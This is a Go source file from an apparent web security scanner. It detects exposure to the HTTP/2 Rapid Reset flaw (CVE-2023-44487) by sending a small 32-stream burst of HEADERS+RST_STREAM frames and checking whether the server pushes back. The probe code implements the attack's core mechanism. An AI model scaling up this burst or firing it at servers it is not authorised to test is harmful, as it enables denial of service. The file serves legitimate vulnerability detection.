// Package h2reset probes a target for HTTP/2 stream-cycling protection
// (CVE-2023-44487, the "Rapid Reset" DDoS vector). The attack opens many
// HEADERS frames on a single H/2 connection, immediately follows each
// with a RST_STREAM, and lets the server burn CPU on stream lifecycle
// work for streams the client cancels before the server can answer.
//
// Mitigated servers either:
//   - cap concurrent streams via SETTINGS_MAX_CONCURRENT_STREAMS, OR
//   - send GOAWAY with ENHANCE_YOUR_CALM after a small number of
//     short-lived cancelled streams, OR
//   - close the connection outright.
//
// Vulnerable servers accept unbounded HEADERS+RST_STREAM cycles without
// pushing back. The probe is intentionally tiny (32 cancelled streams,
// ~50ms total) so we never DoS a real target — the goal is to detect
// the absence of any rate-limit, not to trigger the DoS itself. Even at
// 32 streams a hardened server is observable through GOAWAY or
// connection-close; an unmitigated server is observable through
// uneventful acceptance of the burst.
//
// This detector requires HTTPS+ALPN (HTTP/2 over h2c is rare). Plain
// HTTP targets are skipped.
package h2reset

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"time"

	"github.com/TyrusRC/swiss-knife-for-web-security/internal/core"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// burstSize is how many HEADERS+RST_STREAM pairs we send. 32 is small
// enough to be safe on any half-decent server, large enough to reveal
// missing protection.
const burstSize = 32

// probeTimeout caps the entire probe; we never want to hold a
// connection open for more than this when a target is misbehaving.
const probeTimeout = 5 * time.Second

// Detector probes targetURL's host for HTTP/2 rapid-reset protection.
// The detector intentionally has no http.Client dependency — we speak
// raw TLS+H2 because the goal is to inspect framer-level behaviour the
// stdlib client hides.
type Detector struct {
	// InsecureSkipVerify is propagated to the TLS dialer; useful for
	// scanners that already pass `--insecure` to the rest of the suite.
	InsecureSkipVerify bool
}

// New returns a Detector with conservative defaults.
func New() *Detector { return &Detector{} }

// Result carries findings from Detect.
type Result struct {
	Findings []*core.Finding
}

// Detect connects to targetURL via TLS, negotiates HTTP/2 via ALPN, then
// fires `burstSize` HEADERS+RST_STREAM pairs. If the connection is
// still alive at the end and we never saw a GOAWAY, the host is at risk
// for CVE-2023-44487. Any TLS / ALPN / framer error short-circuits to
// "no finding" — we only flag a clean negative-control result.
func (d *Detector) Detect(ctx context.Context, targetURL string) (*Result, error) {
	res := &Result{}

	u, err := url.Parse(targetURL)
	if err != nil || u.Scheme != "https" {
		return res, nil
	}

	host := u.Host
	if _, _, err := net.SplitHostPort(host); err != nil {
		host = u.Host + ":443"
	}

	dialCtx, cancel := context.WithTimeout(ctx, probeTimeout)
	defer cancel()

	dialer := &tls.Dialer{
		Config: &tls.Config{
			ServerName:         u.Hostname(),
			NextProtos:         []string{"h2"},
			InsecureSkipVerify: d.InsecureSkipVerify, // honoured by callers' --insecure
			MinVersion:         tls.VersionTLS12,
		},
	}
	rawConn, err := dialer.DialContext(dialCtx, "tcp", host)
	if err != nil {
		return res, nil
	}
	defer rawConn.Close()

	tlsConn, ok := rawConn.(*tls.Conn)
	if !ok || tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return res, nil
	}

	// HTTP/2 client preface + initial SETTINGS.
	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
		return res, nil
	}
	framer := http2.NewFramer(tlsConn, tlsConn)
	if err := framer.WriteSettings(); err != nil {
		return res, nil
	}

	// Drain the server's first SETTINGS / pre-amble. Honour
	// MAX_CONCURRENT_STREAMS if the server announces it — an explicit
	// low cap means the host is mitigated.
	if maxStreams, ok := readServerSettings(framer); ok && maxStreams > 0 && maxStreams < uint32(burstSize) {
		// Server caps concurrent streams below our burst — that's the
		// canonical mitigation for rapid-reset. No finding.
		return res, nil
	}

	// Acknowledge the server's SETTINGS.
	if err := framer.WriteSettingsAck(); err != nil {
		return res, nil
	}

	// Build a minimal HEADERS payload via hpack. Same headers reused
	// across every cancelled stream — the server burns work decoding
	// each one regardless.
	hbuf := encodeHeaders(u)

	streamID := uint32(1)
	for i := 0; i < burstSize; i++ {
		select {
		case <-dialCtx.Done():
			return res, nil
		default:
		}
		if err := framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      streamID,
			BlockFragment: hbuf,
			EndStream:     true,
			EndHeaders:    true,
		}); err != nil {
			return res, nil
		}
		if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
			return res, nil
		}
		streamID += 2
	}

	// Probe whether the server pushed back. We poll briefly: any
	// GOAWAY frame, ENHANCE_YOUR_CALM, or connection-close is the
	// "mitigated" signal; absence = vulnerable.
	saw := pollForPushback(framer, 500*time.Millisecond)

	if saw == pushbackProtected {
		return res, nil
	}

	// Vulnerable: no GOAWAY observed, the burst was accepted cleanly.
	res.Findings = append(res.Findings, buildFinding(targetURL, host, saw))
	return res, nil
}

type pushbackKind int

const (
	pushbackNone     pushbackKind = iota // no signal observed
	pushbackProtected                    // GOAWAY / ENHANCE_YOUR_CALM / connection close
)

func pollForPushback(framer *http2.Framer, deadline time.Duration) pushbackKind {
	end := time.Now().Add(deadline)
	for time.Now().Before(end) {
		// http2.Framer doesn't expose a ReadDeadline; we rely on the
		// underlying conn's deadline (set by the dialCtx).
		f, err := framer.ReadFrame()
		if err != nil {
			// Connection closed counts as protection — server
			// disconnected after the burst.
			return pushbackProtected
		}
		switch ft := f.(type) {
		case *http2.GoAwayFrame:
			return pushbackProtected
		case *http2.RSTStreamFrame:
			// Server-initiated RST means the server is actively
			// cancelling our streams; that's a protective response.
			if ft.ErrCode == http2.ErrCodeEnhanceYourCalm {
				return pushbackProtected
			}
		}
	}
	return pushbackNone
}

func readServerSettings(framer *http2.Framer) (uint32, bool) {
	for i := 0; i < 4; i++ {
		f, err := framer.ReadFrame()
		if err != nil {
			return 0, false
		}
		s, ok := f.(*http2.SettingsFrame)
		if !ok {
			continue
		}
		if v, ok := s.Value(http2.SettingMaxConcurrentStreams); ok {
			return v, true
		}
		return 0, true // SETTINGS frame seen but no MAX_CONCURRENT_STREAMS
	}
	return 0, false
}

func encodeHeaders(u *url.URL) []byte {
	var buf [0]byte
	_ = buf
	hpackBuf := newHPACKBuffer()
	hpackBuf.writeHeader(":method", "GET")
	hpackBuf.writeHeader(":scheme", u.Scheme)
	hpackBuf.writeHeader(":authority", u.Host)
	if u.Path == "" {
		hpackBuf.writeHeader(":path", "/")
	} else {
		hpackBuf.writeHeader(":path", u.Path)
	}
	hpackBuf.writeHeader("user-agent", "skws-h2reset/1")
	return hpackBuf.bytes()
}

// hpackBuffer wraps hpack.Encoder so encodeHeaders stays terse.
type hpackBuffer struct {
	enc *hpack.Encoder
	buf []byte
}

func newHPACKBuffer() *hpackBuffer {
	b := &hpackBuffer{}
	b.enc = hpack.NewEncoder(&inlineWriter{buf: &b.buf})
	return b
}

func (h *hpackBuffer) writeHeader(name, value string) {
	_ = h.enc.WriteField(hpack.HeaderField{Name: name, Value: value})
}
func (h *hpackBuffer) bytes() []byte { return h.buf }

type inlineWriter struct{ buf *[]byte }

func (w *inlineWriter) Write(p []byte) (int, error) {
	*w.buf = append(*w.buf, p...)
	return len(p), nil
}

func buildFinding(targetURL, host string, saw pushbackKind) *core.Finding {
	finding := core.NewFinding("HTTP/2 Rapid Reset Exposure (CVE-2023-44487)", core.SeverityMedium)
	finding.URL = targetURL
	finding.Tool = "h2reset"
	finding.Confidence = core.ConfidenceMedium
	finding.Description = fmt.Sprintf(
		"The server accepted %d HEADERS+RST_STREAM cycles on a single HTTP/2 connection without pushing back via GOAWAY, ENHANCE_YOUR_CALM, or SETTINGS_MAX_CONCURRENT_STREAMS. That is the canonical exposure pattern for CVE-2023-44487 (HTTP/2 Rapid Reset DDoS).",
		burstSize,
	)
	finding.Evidence = fmt.Sprintf("Host: %s\nALPN: h2 (negotiated)\nBurst: %d HEADERS+RST_STREAM pairs\nObserved pushback: none (kind=%d)",
		host, burstSize, saw)
	finding.Remediation = "Upgrade to a runtime patched for CVE-2023-44487 (Go 1.21.3+, nginx 1.25.3+, Apache 2.4.58+, Envoy 1.28+, etc.) and configure SETTINGS_MAX_CONCURRENT_STREAMS to a small value. Many runtimes also need an explicit per-connection RST_STREAM rate limit."
	finding.WithOWASPMapping(
		[]string{"WSTG-BUSL-04"},
		[]string{"A04:2025"},
		[]string{"CWE-770"},
	)
	finding.APITop10 = []string{"API4:2023"}
	return finding
}
